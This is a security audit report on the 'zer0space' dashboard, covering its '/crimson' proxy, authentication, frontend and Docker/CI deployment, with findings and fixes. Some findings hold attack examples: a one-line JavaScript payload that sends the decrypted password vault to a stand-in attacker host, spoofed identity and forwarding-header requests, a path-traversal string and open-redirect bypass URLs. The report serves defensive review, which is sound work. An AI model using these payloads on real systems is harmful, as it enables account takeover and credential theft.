# Security Audit: zer0space Dashboard

**Auditor:** 4G0NYY
**Date:** 2026-07-30
**Commit audited:** `a9ed863` (branch `main`)
**Scope:** full repository (`src/`, `static/`, `templates/`, `Dockerfile`, `docker-compose.yml`, CI workflow, scripts, docs)

---

## How to read this document

Every finding has a stable ID so it can be referenced in a ticket without depending on the ordering here. The prefix says which area it lives in:

| Prefix | Area |
|--------|------|
| `CRIM` | The `/crimson` reverse proxy and SSO broker |
| `AUTH` | Sessions, login, 2FA, rate limiting |
| `APP`  | General application and HTTP behaviour |
| `FE`   | Frontend JavaScript and templates |
| `INFRA`| Docker, Swarm, CI, supply chain |

Each entry states what is wrong, why it is wrong, and how an attacker actually reaches it. Where exploitability depends on something outside this repository (most notably the Crimson backend, which lives in another project), that dependency is stated explicitly rather than assumed in the attacker's favour.

A short note before the list, because it matters for how you read the rest: **this is a well built application.** All SQL is parameterised, the password and vault cryptography is correct and correctly threaded off the event loop, the session design deliberately avoids putting the vault key anywhere it could leak, the frontend escaping discipline holds at every call site, and the authorization guards on the admin routes are careful about the last-admin cases. There is no SQL injection, no XSS, no IDOR and no authentication bypass in the application itself.

The findings are concentrated in two places: the `/crimson` gateway added in the last seven commits, and the deployment configuration. That is a normal and expected shape for an audit, and it is worth saying plainly that the oldest, most security-sensitive code (`auth.py`, `vault.py`, `db.py`) is the part that holds up best.

---

## Findings at a glance

| ID | Finding | Severity |
|----|---------|----------|
| [CRIM-1](#crim-1-high-the-gateway-forwards-the-clients-own-identity-headers-to-the-crimson-backend) | Gateway forwards the client's own identity and authorization headers to the Crimson backend | **High** |
| [CRIM-2](#crim-2-high-third-party-crimson-content-is-served-from-the-dashboards-own-origin-which-puts-the-password-vault-inside-its-blast-radius) | Third party Crimson content served same-origin, putting the password vault in its blast radius | **High** |
| [AUTH-1](#auth-1-high-trust_proxy-defaults-to-true-while-the-dashboard-is-also-published-directly-on-the-lan-so-every-per-ip-limit-can-be-bypassed) | Client-controlled source address defeats every per-IP rate limit, and the documented fix does not work | **High** |
| [INFRA-1](#infra-1-high-glances-is-published-unauthenticated-on-every-node-with-the-docker-socket-mounted) | Glances published unauthenticated on every node with the Docker socket mounted | **High** |
| CRIM-3 | Upstream response headers relayed verbatim, including `Set-Cookie` | Medium |
| CRIM-4 | Client-controlled `Host` and `X-Forwarded-Proto` sent to the backend; no allowed-hosts check | Medium |
| CRIM-5 | Path traversal through the proxy reaches arbitrary backend paths | Medium |
| CRIM-6 | Entire `/crimson` prefix exempt from CSRF | Medium |
| APP-1 | No request body size limit, unauthenticated, on a single-replica service | Medium |
| APP-2 | Session cookie is not `Secure` by default and unlocks the vault for 24 hours | Medium |
| APP-3 | No `Cache-Control: no-store` on responses containing decrypted passwords | Medium |
| INFRA-2 | Live shared credential (`CRIMSON_SSO_INVITE_CODE`) hardcoded in a public repo | Medium |
| INFRA-3 | Long-lived classic PAT exposed to five mutable third-party actions, feeding `:latest` | Medium |
| INFRA-4 | Socket proxy image untagged; its deny behaviour is inherited, not declared | Medium |
| INFRA-5 | Documented break-glass recovery cannot work; `scripts/` is not in the image | Medium |
| INFRA-6 | No `permissions:` block while CI executes untrusted PR code | Medium |
| INFRA-7 | Dependencies and base image not actually reproducible, contrary to the stated goal | Low to Medium |
| AUTH-2 to AUTH-6, APP-4 to APP-6, FE-1 to FE-6, INFRA-8 to INFRA-14 | See the Low and hardening sections | Low / Informational |

**No secrets were found in the repository or in any of its 24 commits across four refs.** Details in the verification section at the end. The one exception is INFRA-2, which is a defaulted credential in a tracked file rather than a leaked one.

---

## Remediation status

Branch `security/audit-remediation` addresses the following. Everything in it was verified with a purpose-built harness (26 behavioural checks) plus the repository's own CI steps: byte-compile, application import, template parse, JavaScript syntax, and German/English dictionary parity at 344 keys each.

| Status | Findings |
|--------|----------|
| **Fixed in the branch** | CRIM-1, CRIM-3, CRIM-4, CRIM-5, AUTH-1, AUTH-3, APP-1, APP-2, APP-3, INFRA-1 (partially, see below), INFRA-2, INFRA-3, INFRA-4, INFRA-5, INFRA-6, INFRA-9, INFRA-11, INFRA-13, FE-1, FE-2, FE-3, FE-4 |
| **Needs an action outside the repository** | INFRA-2 (rotate the burned code on the Crimson backend), INFRA-1 (firewall port 61208 on every node), INFRA-11 (recreate `dashboard_net`, Docker cannot enable encryption in place) |
| **Deliberately not attempted** | CRIM-2, CRIM-6, AUTH-2, AUTH-4, AUTH-5, AUTH-6, APP-4, APP-5, APP-6, INFRA-7, INFRA-8, INFRA-10, INFRA-12, INFRA-14, FE-5, FE-6 |

Three things about that middle row matter more than the code changes:

1. **The Crimson invite code is burned.** Removing the default from `docker-compose.yml` stops it shipping again; it does nothing about the value already published in git history. It has to be rotated on the backend.
2. **Glances is still unauthenticated.** The `docker.sock` mount is gone, which removes the host-root escalation, but port 61208 still serves every host's process list to the LAN with no credentials. The port cannot simply be dropped, because the dashboard reaches each node at its LAN address, so metrics depend on it. Until Glances authentication is wired up on both ends, this needs a firewall rule on every node.
3. **`COOKIE_SECURE` now defaults to true and the LAN port is commented out.** These two go together and are the one deliberate operational change in the branch. Setting the first without the second would break logins over plain HTTP.

**CRIM-2 is the significant one left open.** Moving Crimson to its own origin is a deployment change (a hostname, a Cloudflare route, a token exchange) that cannot be made honestly from inside this repository, and a partial fix would read as a solved problem while the vault stayed one upstream XSS away. It is still the finding with the largest blast radius. AUTH-4, a vault lock step, remains the cheap mitigation worth shipping first.

---

# Critical and High

## CRIM-1 (High): The gateway forwards the client's own identity headers to the Crimson backend

**Files:** `src/crimson.py:124-171`, `src/main.py:459-494`

`build_request_headers()` copies every inbound client header to the upstream, minus a small deny list:

```python
for key, value in request.headers.items():
    lk = key.lower()
    if lk in _HOP_BY_HOP:
        continue
    if lk == "cookie":
        continue
    if lk == "accept-encoding":
        continue
    if lk == "authorization" and bearer:
        continue
    if lk in _MANAGED_FORWARDED:
        continue
    out[key] = value
```

The identity header that the backend is told to trust, `config.CRIMSON_USER_HEADER` (default `X-Zer0space-User`), is **not** in any of those deny lists. Neither `_HOP_BY_HOP` nor `_MANAGED_FORWARDED` contains it. It is therefore copied straight through from whatever the client sent.

The gateway then sets its own value at the end of the function:

```python
if bearer:
    out["Authorization"] = f"Bearer {bearer}"
elif inject_user:
    out[config.CRIMSON_USER_HEADER] = inject_user
```

There are two separate problems here.

**Problem one, the SSO path.** When `CRIMSON_SSO_ENABLED` is on, `crimson_api` calls `build_request_headers(request, bearer=bearer, ...)` and never passes `inject_user`. So the `elif` branch never runs, and the client's spoofed `X-Zer0space-User` header is forwarded with nothing overwriting it.

**Problem two, the non-SSO path.** Even when `inject_user` is passed, the overwrite is not reliable, because the copy loop preserves the client's original header casing while the assignment uses the canonical casing from config. Python dictionaries are case sensitive, so `x-zer0space-user` and `X-Zer0space-User` are two different keys and **both are sent**. I verified this against the installed httpx rather than assuming it:

```
HEADERS [... (b'x-zer0space-user', b'1'), (b'X-Zer0space-User', b'7')]
```

Both reach the wire. Which one the backend honours depends on its header parsing, and a framework that returns the first match will return the attacker's value.

**Attack.** Any authenticated zer0space user, including a low privilege `viewer`, sends:

```
GET /crimson/api/account/favorites HTTP/1.1
Cookie: zs.sid=<their own valid session>
X-Zer0space-User: 1
```

The gateway authenticates them as themselves, then hands the backend an identity of the attacker's choosing. If the Crimson backend trusts that header, which is precisely what `config.py:198` describes it as ("Header name the backend trusts for a gateway-authenticated user"), this is horizontal and vertical privilege escalation against every Crimson account.

**Dependency stated honestly:** the impact lands in the Crimson backend, which is not in this repository. If that backend currently ignores the header, the bug is latent rather than live. It should still be fixed here, because the gateway is the component making the trust claim, and a backend change could activate it silently.

**Fix.** Add the identity header to the strip list unconditionally, and normalise casing when building the outbound dictionary:

```python
_STRIP_ALWAYS = _HOP_BY_HOP | _MANAGED_FORWARDED | {
    "cookie", "accept-encoding", config.CRIMSON_USER_HEADER.lower(),
}
```

Build `out` with lowercased keys throughout so a later assignment always replaces rather than duplicates. Strip `authorization` unconditionally too, not only when `bearer` is set: on the non-SSO path the client's own bearer token is currently forwarded verbatim.

---

## CRIM-2 (High): Third party Crimson content is served from the dashboard's own origin, which puts the password vault inside its blast radius

**Files:** `src/main.py:446-541`, `src/crimson.py:81-96`

The design goal is stated in the module docstring: proxy Crimson at the same origin "so a signed-in zer0space user reaches Crimson at the same origin (no CORS)". That is convenient, and it is also the single largest structural risk in the codebase.

Everything served under `/crimson` is same-origin with the dashboard. That means JavaScript running in a Crimson page is same-origin with `/api/vault`. And `GET /api/vault` returns **every one of the user's stored credentials, already decrypted**, because the vault key is held in the server side session:

```python
rows = await db.fetch(
    "SELECT * FROM vault_entries WHERE user_id = $1 ORDER BY LOWER(title)", session["user_id"]
)
return JSONResponse([vault.row_to_entry(r, key) for r in rows])
```

A `GET` needs no CSRF token, and `samesite=strict` is irrelevant because the request is not cross-site at all.

**Attack.** One line of JavaScript executing anywhere under `/crimson` exfiltrates the user's entire password vault:

```js
fetch('/api/vault').then(r => r.text()).then(d => navigator.sendBeacon('https://attacker/', d));
```

The realistic path to executing that line is not a bug in this repository. Crimson Haven is a third party streaming aggregator that renders scraped titles, descriptions, poster URLs and embed links from remote sources. That is a large, hostile, constantly changing input surface maintained by someone else. A single reflected or stored XSS in that SPA, or one malicious upstream metadata field that reaches `innerHTML`, converts directly into full compromise of the zer0space vault for every user who visits Crimson.

The relaxed CSP applied to those responses widens this further compared to the dashboard's own policy:

```python
"img-src 'self' data: blob: https:",
"media-src 'self' blob: https:",
"connect-src 'self' https:",
"frame-src https:",
```

`connect-src https:` permits exfiltration to any HTTPS host, and `frame-src https:` permits framing arbitrary remote content. `script-src 'self'` still applies, but `'self'` now includes every path on the dashboard origin.

**Fix, in order of preference.**

1. Serve Crimson from a **separate origin** (for example `crimson.zer0space.com`) and gate it with a signed, short lived token minted by the dashboard. Cross-origin is exactly the isolation you want here, and the "no CORS" convenience is not worth the vault.
2. If it must stay same-origin, add a `Set-Cookie` scoped session that cannot reach `/api/*`, or require a second, non-cookie credential (an `Authorization` header held only by the dashboard SPA) for the vault routes, so ambient cookie authority is not sufficient to read secrets.
3. As an immediate partial mitigation, require an explicit unlock step before `GET /api/vault` returns plaintext, so the vault is not permanently readable for the whole 24 hour session lifetime. See AUTH-4.

---

## AUTH-1 (High): `TRUST_PROXY` defaults to true while the dashboard is also published directly on the LAN, so every per-IP limit can be bypassed

**Files:** `src/config.py:150`, `src/auth.py:221-236`, `docker-compose.yml:4-5,36`

`client_ip()` decides what to count rate limits against:

```python
if config.TRUST_PROXY:
    cf = request.headers.get("cf-connecting-ip")
    if cf:
        return cf.strip()[:100]
    xff = request.headers.get("x-forwarded-for")
    if xff:
        return xff.split(",")[0].strip()[:100]
return (request.client.host if request.client else "unknown")[:100]
```

The header is only trustworthy if the *only* way to reach the application is through the Cloudflare Tunnel, because Cloudflare overwrites `cf-connecting-ip` on the way in. The compose file breaks that assumption in the same deployment:

```yaml
  dashboard:
    ports:
      - "8080:3000"
```

and then defaults the flag to the trusting value:

```yaml
      - TRUST_PROXY=${TRUST_PROXY:-true}
```

Port 8080 is published on the Swarm ingress network, so the dashboard answers directly on every node's LAN address. Requests arriving that way never pass through Cloudflare, and `cf-connecting-ip` on them is whatever the client typed. The comment directly above the setting says to set it to false "ONLY if the dashboard is exposed directly", and the deployment exposes it directly.

**Attack.** From anywhere on the LAN, or from anywhere at all if port 8080 is reachable through the firewall:

```
POST http://192.168.0.x:8080/api/login
CF-Connecting-IP: 10.0.0.<random each request>
{"username":"admin","password":"<guess>"}
```

Each request is attributed to a fresh source address, so `LIMITS["ip"]` (10 failures in 15 minutes) never trips. What this does and does not defeat, stated precisely:

- **Fully defeated:** the per-IP login limit, and the registration limit at `LIMITS["register"]`, which is counted *only* per IP. Invite redemption attempts become unlimited.
- **Still standing:** the per-username limit (5 failures in 10 minutes) and the 10-failure account lockout, since those key on the username. So this is not on its own a password cracking win against one known account. It is a clean win for spraying one password across many accounts, for unlimited invite-code attempts, and for stripping the value out of the audit trail.
- **Bonus effect:** the spoofed value is written to `login_attempts.ip` and rendered in the admin audit view, so an attacker controls what the operator sees in the "is anyone knocking" panel and can bury real activity under noise. The value is correctly HTML-escaped on render (see FE notes), so this is log poisoning, not XSS.

**The obvious fix does not work on its own, and this is the important part.** The natural response is "set `TRUST_PROXY=false`", which is exactly what `docs/security.md:141-145` instructs. That would fall through to the last line of `client_ip()`:

```python
return (request.client.host if request.client else "unknown")[:100]
```

But `request.client.host` is **also** attacker controlled, because of `Dockerfile:48`:

```dockerfile
CMD ["uvicorn", "src.main:app", "--host", "0.0.0.0", "--port", "3000", "--workers", "1", "--proxy-headers", "--forwarded-allow-ips", "*"]
```

`--forwarded-allow-ips *` tells uvicorn's proxy-headers middleware to trust `X-Forwarded-For` from **any** peer, and when it trusts it, it overwrites `scope["client"]` with the client-supplied value. So both branches of `client_ip()` read from attacker controlled headers, and turning `TRUST_PROXY` off merely changes which header the attacker has to set:

```
POST http://192.168.0.x:8080/api/login
X-Forwarded-For: 203.0.113.<random>
```

`--proxy-headers` also lets a caller assert `X-Forwarded-Proto: https` over a plain HTTP connection, which flips `request.url.scheme` and feeds directly into the forwarded-header logic described in CRIM-4.

**Fix, and all three parts are needed.**

1. Replace `--forwarded-allow-ips *` with the tunnel's actual overlay subnet, or make it configurable so the LAN deployment can set it to empty. Without this, nothing else in this finding is fixable.
2. Set `TRUST_PROXY=false`, or better, only honour `cf-connecting-ip` when the immediate peer is in the tunnel's subnet:
   ```python
   if config.TRUST_PROXY and _peer_is_trusted(request.client.host):
       ...
   ```
3. Stop publishing port 8080 on the ingress mesh, or firewall it, so the tunnel is genuinely the only path in.

**Documentation note.** `docs/security.md` contradicts itself on this point. Lines 141-145 say `TRUST_PROXY` must be false if the dashboard is ever exposed directly; lines 366-368 describe LAN access at `http://node:8080` as normal operating procedure. Both cannot be true, and the shipped configuration follows the wrong one.

---

# Medium

## CRIM-3 (Medium): Upstream response headers are copied to the client verbatim, including `Set-Cookie`

**File:** `src/crimson.py:174-183`

```python
def _response_headers(upstream: httpx.Response) -> dict[str, str]:
    out: dict[str, str] = {}
    for key, value in upstream.headers.items():
        if key.lower() in _HOP_BY_HOP:
            continue
        out[key] = value
```

Only hop-by-hop headers are filtered. Everything else the Crimson upstream sends is relayed to the browser **as if the dashboard origin had sent it**. Two consequences:

- **`Set-Cookie` from the upstream lands on the dashboard origin.** A compromised or simply careless Crimson backend can set or overwrite cookies for `zer0space.com`, including a cookie named `zs.sid`. Since the session middleware reads `request.cookies.get(config.SESSION_COOKIE)` and the store rejects unknown ids, this is not directly session forgery, but it is a clean session fixation and denial-of-service primitive: overwrite `zs.sid` and the victim is silently signed out, or is pinned to a session id the upstream chose.
- **CORS headers are relayed.** If the upstream returns `Access-Control-Allow-Origin: *`, that header is now being served from the dashboard's origin on those paths, which invites cross-origin reads of proxied content that the same-origin policy would otherwise have blocked.

**Fix.** Switch to an allow list for response headers rather than a deny list. Relay `content-type`, `cache-control`, `etag`, `last-modified`, `content-range`, `accept-ranges` and little else, and drop `set-cookie` and every `access-control-*` header outright.

## CRIM-4 (Medium): Client controlled `Host` and `X-Forwarded-Proto` are handed to the backend for building absolute URLs, with no allowed-hosts validation anywhere in the app

**Files:** `src/crimson.py:160-165`, `src/main.py` (no `TrustedHostMiddleware` registered)

```python
proto = request.headers.get("x-forwarded-proto", request.url.scheme)
out["X-Forwarded-Proto"] = proto.split(",")[0].strip()
host = request.headers.get("host") or request.url.netloc
out["X-Forwarded-Host"] = host
```

`_MANAGED_FORWARDED` correctly strips whatever the client sent for these three headers, but then both values are read straight back out of client controlled headers. `Host` is client controlled on any direct request, and `x-forwarded-proto` is client controlled for the same reason described in AUTH-1. The application registers no `TrustedHostMiddleware`, so no layer validates `Host` at all.

Per the comment in the same function, the backend uses these to emit absolute stream and proxy URLs. An attacker sending `Host: attacker.example` therefore steers the URLs the backend generates. Whether that becomes a redirect to attacker infrastructure, a poisoned cached response, or a leaked HMAC-signed proxy token depends on the backend, so this is Medium rather than High here.

**Fix.** Add `TrustedHostMiddleware` with the real hostnames, and derive the forwarded values from configuration (a `PUBLIC_BASE_URL` setting) rather than from request headers.

## CRIM-5 (Medium): Path traversal through the proxy reaches arbitrary backend paths

**Files:** `src/crimson.py:186-190`, `src/main.py:506-526`

```python
def _target(base_url: str, subpath: str, request: Request) -> str:
    target = f"{base_url}/{subpath.lstrip('/')}"
```

`subpath` comes from a `{path:path}` route parameter, already URL-decoded by Starlette, and is concatenated without normalisation. I confirmed how httpx resolves the result:

```
'x_proxy/../../secret'  ->  http://crimson-api:8000/secret
```

The good news is that dot segments cannot escape the authority, so this is **not** a cross-host SSRF: the attacker cannot pivot to the Docker socket proxy, to Glances, or to the metadata service. The reachable damage is that the media relay routes at `/{proxy_name}_proxy/{rest:path}`, which are meant to forward only the signed HLS sub-resource chain, can be used to reach any path on the Crimson API, including paths the gateway never intended to expose and which do not carry the SSO bearer.

Note also that these two routes are registered at the **root** of the dashboard, so the dashboard permanently owns every URL matching `/<anything>_proxy` whenever Crimson is enabled.

**Fix.** Reject any `subpath` containing a `..` segment before building the target, and constrain `proxy_name` with a route regex (`{proxy_name:str}` matching `^[a-z0-9_]+$`) rather than accepting any segment.

## CRIM-6 (Medium): The entire `/crimson` prefix is exempt from CSRF

**File:** `src/main.py:222-231`

```python
is_crimson = path == config.CRIMSON_PATH or path.startswith(config.CRIMSON_PATH + "/")
if (
    request.method not in auth.CSRF_SAFE_METHODS
    and path not in self.EXEMPT
    and not is_crimson
):
```

Every state-changing method on every path under `/crimson`, including `/crimson/api/*`, skips the double-submit check. The stated compensating control is `samesite=strict` on the session cookie, and that control is real: a cross-site POST will not carry `zs.sid`. So this is defence in depth that has been removed, not an immediately exploitable CSRF.

It is Medium rather than Low because the cookie's `Secure` attribute defaults to off (APP-2), and because it removes the second layer precisely on the routes that proxy third party content, where the first layer is most likely to be tested.

**Fix.** Have the dashboard shell inject the CSRF token into the Crimson SPA and echo it, or scope the exemption to the specific upstream paths that genuinely cannot carry it, rather than to the whole prefix.

## APP-1 (Medium): No request body size limit, on a single-replica service, reachable unauthenticated

**Files:** `src/main.py:72-84`, `src/crimson.py:240`

`json_body()` calls `await request.json()`, and `crimson.proxy()` calls `await request.body()`. Both buffer the entire request body into memory. Starlette applies no default maximum, and no limit is configured at the uvicorn or middleware layer.

`POST /api/login` is unauthenticated and reaches `json_body`. So any anonymous client can send a multi-gigabyte body and force the process to buffer it. The service runs at `replicas: 1` by design, and that constraint is load-bearing for the session store, so there is no second instance to absorb it. Killing the process signs out every user, which is a cheap and repeatable denial of service.

**Fix.** Add a middleware that rejects requests whose `Content-Length` exceeds a sane cap (a few hundred kilobytes for the API, larger only for the Crimson proxy paths), and reject chunked bodies that exceed the cap as they stream.

## APP-2 (Medium): The session cookie is not `Secure` by default, and it is the key to the vault for 24 hours

**Files:** `src/config.py:143-144`, `docker-compose.yml:9-10`

```python
FORCE_HTTPS = _bool("FORCE_HTTPS", False)
COOKIE_SECURE = FORCE_HTTPS or _bool("COOKIE_SECURE", False)
```

Both default to false, and compose defaults them to false again. The dashboard is simultaneously served over plain HTTP on port 8080. So in the shipped configuration the `zs.sid` cookie is transmitted in cleartext on the LAN.

That cookie is not merely an authentication token. Because the derived vault key lives in the server side session for `SESSION_MAX_AGE` (24 hours by default), possession of the cookie is possession of the decrypted vault for up to a day. Anyone able to observe LAN traffic, whether on a shared switch, a compromised device, or hostile WiFi, captures it passively and then reads every stored credential with a single `GET /api/vault`.

The reasoning behind the default is documented and sound in isolation (an HSTS entry would break plain HTTP LAN access). The problem is the combination: the LAN listener and the insecure cookie default are enabled together.

**Fix.** Set `COOKIE_SECURE=true` and serve the LAN listener over TLS, or remove the plain HTTP port and reach the dashboard only through the tunnel. `COOKIE_SECURE` can be set independently of `FORCE_HTTPS`, so the HSTS concern does not have to block it.

## APP-3 (Medium): Responses containing decrypted secrets carry no cache directives

**Files:** `src/main.py:1249-1259` and every other `/api/*` handler; `SecurityHeadersMiddleware` at `src/main.py:148-204`

The security headers middleware sets CSP, `nosniff`, frame options, referrer policy and friends, but never sets `Cache-Control`. No route sets it either. `GET /api/vault` therefore returns plaintext passwords with no `no-store`.

Consequences, from most to least likely:

- The response body is written to the **browser's on-disk HTTP cache**, so cleartext passwords persist on the user's filesystem after the tab is closed, and survive logout.
- Any intermediate cache that is more aggressive than Cloudflare's defaults, or any future misconfiguration of a caching rule, can store and serve it. Cloudflare will not cache it by default given the request carries cookies, so this is a latent risk rather than a live one.

**Fix.** Add `Cache-Control: no-store, private` in `SecurityHeadersMiddleware` for every response whose path starts with `/api/`.

---

# Low and hardening

## AUTH-2 (Low): `POST /api/2fa/verify` does not re-check the password, though the comment says it does

**File:** `src/main.py:1035-1102`

The section header states:

```
# All three re-check the current password even though the session is already
# authenticated: turning a second factor on or off is sensitive enough to
# re-confirm identity, which also covers a hijacked-but-unlocked browser tab.
```

`api_2fa_setup` and `api_2fa_disable` do. `api_2fa_verify` does not: it only requires `pending_totp_secret` to be present in the session. The practical gap is narrow, since an attacker with a live session who wanted to enrol their own authenticator would still have to pass `api_2fa_setup`, which does check the password. But the invariant the comment claims is not the invariant the code enforces, and someone reading the comment will trust it during a future change.

**Fix.** Either check the password in `verify` as well, or correct the comment.

## AUTH-3 (Low): The 2FA step does not re-check account lock state

**File:** `src/main.py:819-885`

`api_login` checks `auth.is_locked(user)` before opening a pending session. `api_2fa_login` re-fetches the user but never re-checks. If an admin locks an account during the five minute pending window, the holder of that pending session can still complete the second factor and obtain a full session.

**Fix.** Add the `auth.is_locked(user)` check alongside the existing `not user or not user["totp_enabled"]` guard.

## AUTH-4 (Low, but read it alongside CRIM-2): the vault has no lock step

The vault key is derived at login and held for the full 24 hour session. There is no re-authentication before reading secrets, and no idle timeout that clears the key. `vaultUnlocked` in `/api/me` is therefore true for the entire session.

This is a deliberate design decision and it is documented as such. It is listed here because it is the multiplier on every other finding in this report: it is what turns "an XSS somewhere" or "a stolen cookie" into "the whole vault", rather than into "the attacker can act as the user". Adding a re-prompt before the first vault read of a session, and clearing `vault_key` after some minutes of inactivity, would meaningfully shrink the impact of CRIM-2, APP-2 and APP-3 at once.

## AUTH-5 (Low): The plaintext password sits in the session during the 2FA window

**File:** `src/main.py:791`

```python
session["pending_2fa_password"] = password  # kept only until /api/2fa/login succeeds
```

The plaintext password is held in process memory for up to five minutes. It is popped on success, but a pending session that is abandoned keeps it until the session expires, since nothing clears it on the `pending_2fa_expires` path. It is in memory only and never serialised, so this is a hardening note, not an exposure: it widens the window in which a core dump or a memory disclosure bug yields a plaintext password.

**Fix.** Derive the vault key at step one and store the derived key instead of the password, or clear the field in the housekeeping sweep when a pending session has expired.

## AUTH-6 (Low): Account lockout is a usable denial of service against known usernames

**File:** `src/auth.py:79-88`

Ten failed attempts lock an account for thirty minutes, and the per-username limit is not IP-scoped, so it cannot be evaded but it also cannot be aimed. An attacker who knows a username can keep that account locked indefinitely by sending ten bad passwords every thirty minutes. The design deliberately chose a self-expiring lock over a permanent one, and the reasoning given for that (a permanent lock on a guessable admin name would be worse) is correct. This is the residual cost of that correct decision, noted so it is a known cost rather than a surprise.

## APP-4 (Low): `/healthz` is unauthenticated and discloses build and database state

**File:** `src/main.py:581-588`

```python
return JSONResponse({"ok": True, "db": db.is_ready(), "version": ASSET_VERSION})
```

Anonymous callers learn the exact application version and whether PostgreSQL is currently reachable. The version tells an attacker which findings in this report apply to a given deployment, and the database flag tells them when the system is degraded, which is when to attack. Minor, but it is free to fix: return a bare `200` with no body to unauthenticated callers and keep the detail for authenticated ones.

## APP-5 (Hardening): CSRF exemption matching is path-prefix based and is not normalisation-safe

**File:** `src/main.py:210,226`

`CsrfMiddleware` decides exemption from `request.url.path`, which is the raw, un-normalised ASGI path. A request to `/crimson/../api/vault` matches the `startswith` check and skips CSRF.

I checked whether this is exploitable and concluded that **it is not, today**: Starlette's router matches on the same raw path, so the request that skipped the check also fails to match the `/api/vault` route and 404s. The exemption and the routing agree because they read the same string. It becomes exploitable only if a component in front of the app normalises the path after this check, or if a future refactor introduces normalisation between the two. It is listed as hardening because the safety here is incidental rather than designed.

**Fix.** Normalise the path once at the top of the middleware and decide both the exemption and the logging from the normalised value.

## APP-6 (Hardening): Secrets are stored in the `settings` table in plaintext

**Files:** `src/main.py:271-333`

When no Swarm secret or environment variable is present, `session_secret` and `totp_enc_key` are generated and written to the `settings` table as plaintext. Anyone with read access to the database therefore has both.

The impact is smaller than it first looks and the code deserves credit for that. The session secret only signs a session **id**; the id is then looked up in the in-memory store, so knowing the secret does not let an attacker forge a working session. The allow list on `/api/settings` (`PUBLIC_SETTINGS`) correctly prevents either value from being read through the API, and the comment explaining why it is an allow list rather than a deny list is exactly the right instinct.

What a database reader does get is `totp_enc_key`, which decrypts every stored TOTP secret, which means they can generate valid second factors for every enrolled user. Since the vault is specifically designed to survive a database compromise, it is worth closing the gap so that 2FA survives it too.

**Fix.** Treat both as required configuration in production. Set the `session_secret` and `totp_enc_key` Swarm secrets so the database fallback path is never taken, and consider logging a warning at boot when the fallback is used.

---

# Frontend

The client-side sweep covered all 15 files in `static/js/` (4,187 lines), all 11 templates, and the stylesheets. **No XSS, no open redirect, no CSRF defect and no client-side secret storage issue was found.** The `esc()` / `safeUrl()` convention is applied correctly at every site where genuinely tainted data reaches a sink. The four items below are all Low or Informational.

## FE-1 (Low): `safeUrl()` has a fast path that returns input unparsed, and `/\host` escapes the origin through it

**File:** `static/js/ui.js:171-181`

```js
if (/^\//.test(raw) && !/^\/\//.test(raw)) return raw;
```

The guard rejects protocol-relative `//evil.com`, but it only looks for two *forward* slashes. Per the WHATWG URL specification, the parser treats a backslash as a slash in the relative-slash and special-authority states for special schemes, so **`/\evil.com` resolves to `http://evil.com/`** in Chrome, Firefox and Safari. That string passes the first test, fails the second, and is returned verbatim without ever reaching the `new URL()` scheme check below it. The same applies to `/\/evil.com` and `/\\evil.com`.

**Attacker-controllability: admin only, and it grants an admin nothing new.** `safeUrl()` has exactly one call site, `serviceTile()` at `static/js/app.js:326`, and service rows are created through `POST /api/services`, which is admin gated. An admin who wants a tile pointing at an external host can simply type one in: that field is a free-form external link by design. A viewer cannot reach it at all.

It is worth fixing anyway because the fast path is the single branch that returns unparsed input while its comment claims it returns "a site-relative path", which is not what it does. The moment `safeUrl()` is reused for something where same-origin actually is the security property, a `next=` redirect, an iframe `src`, a fetch target, this becomes a live open redirect with no change at the call site.

**Fix.** Delete the fast path and let the parser decide. Site-relative paths still work, because they resolve against `window.location.origin`.

Every other classic bypass was tested and is correctly blocked: uppercase `JaVaScRiPt:`, embedded tab, newline and carriage return inside the scheme, leading whitespace, leading NUL and C0 controls, `data:text/html`, `vbscript:`, `blob:` and `file:`. The `new URL()` approach is the right one, which is exactly why the branch that skips it stands out.

## FE-2 (Hardening): `esc()` is safe in text and quoted-attribute contexts only, and does not say so

**File:** `static/js/ui.js:159-166`

The escaper is correct for what it covers. Ordering is right (`&` is replaced first, so there is no double-escaping bug) and it escapes both quote characters, so it is safe inside `attr="..."` and `attr='...'` alike.

It is not safe in three contexts it does not touch: **unquoted attributes** (it does not escape space, `=`, backtick or `/`, so `<div data-x=ESC>` would permit an `onmouseover=` injection), **inside `<script>`**, and **inside `style="..."`**.

All ~60 call sites in `app.js` and `monitoring.js` were checked individually and every attribute interpolation is double-quoted, so there is no live vulnerability. This is a note that the contract belongs in the comment, because the next person adding markup is one unquoted attribute away from an XSS that the current review convention would not catch. Given that the audit log renders anonymous-attacker-controlled strings into an admin's page, that margin is thinner than it looks.

**Fix.** One comment line: "HTML text and quoted-attribute contexts only. Not safe unquoted, and not a JS or CSS escaper."

## FE-3 (Informational): two `innerHTML` sites bypass `esc()`, breaking the convention without breaking security

**File:** `static/js/app.js:913` and `:926-929`

Neither is exploitable. At line 913 the interpolated value has already been through `ZS_ICONS.sanitize()` (`static/js/icons.js:29-37`), which applies `.replace(/[^a-z0-9-]/g, '').slice(0, 60)`, so no character capable of closing an attribute survives. At lines 926-929 the value iterates a hardcoded literal array.

They are listed because `app.js:9-12` states the invariant as "everything that lands in innerHTML goes through ZS_UI.esc() first", and these two lines read as exceptions to it. Wrapping them costs nothing, is a no-op on already-sanitised data, and keeps the convention checkable by grep rather than by argument.

## FE-4 (Informational): `api.js` drops the CSRF header instead of failing when the token is unset

**File:** `static/js/api.js:38-40`

```js
if (!SAFE[method] && csrfToken) {
  options.headers['X-CSRF-Token'] = csrfToken;
}
```

If `csrfToken` is null, the state-changing request is sent without the header rather than being refused. This is fail-open on the client but it is not exploitable, because the server enforces CSRF regardless and an attacker cannot cause a victim's browser to omit a header in a way that helps them. The real-world outcome is a confusing UX failure: `app.js:1123` sets the token only after `/api/me` resolves, while every button is wired in `init()` before that await, so a user who clicks quickly during a slow `/api/me` gets an unexplained rejection.

Token leakage was checked and is clean. Every request path is a hardcoded literal or a literal concatenated with a database integer id, so no attacker-supplied string can turn a path into `//evil.com` and carry the header off-origin. `credentials: 'same-origin'` is set on every request.

**Fix.** Throw a clear client-side error when the token is missing rather than silently omitting it.

## FE-5 (Informational): `github_url` and `status_url` reach `href` without a scheme check

**Files:** `templates/landing.html` (lines 21, 49, 142-144, 213, 219, 222), `templates/maintenance.html:31`

Both come from environment variables. Jinja autoescaping is on, so there is no attribute breakout, but the scheme is unchecked, so an operator who set `GITHUB_URL=javascript:...` would ship a clickable `javascript:` link on the public landing page. Self-inflicted only: whoever sets that variable can already change the whole image. Recorded for completeness rather than as an action item.

## FE-6 (Non-security bug): the `#audit-reload` button does nothing

**File:** `templates/dashboard.html:426`

